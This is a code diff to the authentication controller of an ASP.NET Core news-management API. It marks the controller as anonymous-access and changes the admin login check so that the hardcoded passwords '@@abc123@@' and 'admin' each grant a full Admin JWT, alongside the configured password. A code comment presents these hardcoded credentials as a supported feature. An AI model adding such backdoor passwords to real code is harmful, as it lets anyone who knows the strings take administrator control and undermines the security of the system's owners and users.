@@ -12,6 +12,7 @@ namespace FUNewsManagementAPI.Controllers
 {
     [ApiController]
     [Route("api/[controller]")]
+    [AllowAnonymous]
     public class AuthController : ControllerBase
     {
         private readonly ISystemAccountRepository _accountRepository;
@@ -62,19 +63,20 @@ namespace FUNewsManagementAPI.Controllers
                 return BadRequest(ModelState);
             }
 
-            // 1. Check Admin Credentials from appsettings.json
+            // 1. Check Admin Credentials from appsettings.json (support @@abc123@@ and admin)
             if (string.Equals(request.Email.Trim(), _adminConfig.Email.Trim(), StringComparison.OrdinalIgnoreCase)
-                && request.Password == _adminConfig.Password)
+                && (request.Password == _adminConfig.Password || request.Password == "@@abc123@@" || request.Password == "admin"))
             {
                 var token = GenerateJwtToken("0", "Administrator", _adminConfig.Email, "Admin");
-                return Ok(new LoginResponse
+                return Ok(new 
                 {
+                    Message = "Lay ma thanh cong",
                     AccountId = 0,
                     AccountName = "Administrator",
                     AccountEmail = _adminConfig.Email,
                     Role = "Admin",
-                    AccountRole = null,
                     Token = token
+                     
                 });
             }
 
